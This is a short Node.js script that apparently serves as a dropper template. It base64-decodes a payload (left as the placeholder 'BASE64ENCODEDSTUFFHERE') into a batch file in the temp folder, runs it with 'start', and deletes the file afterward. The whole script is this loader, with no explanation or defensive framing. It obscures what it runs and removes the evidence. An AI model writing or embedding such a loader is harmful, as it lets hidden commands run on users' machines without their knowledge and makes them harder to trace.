const fs = require('fs');
const os = require('os');
const path = require('path');
const exec = require('child_process').exec;

function main() {
    var tempDir = path.join(os.tmpdir(), "KDoTemp.bat");
    var b64stuff = "BASE64ENCODEDSTUFFHERE";
    var decoded = Buffer.from(b64stuff, 'base64').toString('utf-8');
    fs.writeFile(tempDir, decoded, function(err) {
        if (err) {
            console.log(err);
            return;
        }

        exec("start " + tempDir, function (err, stdout, stderr) {
            if (err) {
                console.log(err);
            }
            fs.unlinkSync(tempDir);
        });
    });
}

main();